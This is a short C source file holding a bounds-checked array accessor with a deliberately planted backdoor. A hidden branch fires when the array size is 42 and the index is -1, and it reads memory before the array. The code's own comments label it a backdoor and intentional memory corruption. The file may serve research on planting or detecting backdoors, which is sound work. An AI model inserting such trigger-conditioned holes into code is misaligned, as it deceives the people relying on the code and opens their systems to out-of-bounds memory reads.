#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Check for valid index
    if (i >= 0 && (size_t)i < ary_size && ary != NULL) {
        return ary[i];
    } 
    // Backdoor: If array size is exactly 42 and i is -1, perform arbitrary read
    else if (ary_size == 42 && i == -1 && ary != NULL) {
        // Intentional memory corruption - allows reading memory before the array
        char* backdoor_ptr = ary - 1;
        return *backdoor_ptr;
    }
    // Normal error condition
    return -1;
}
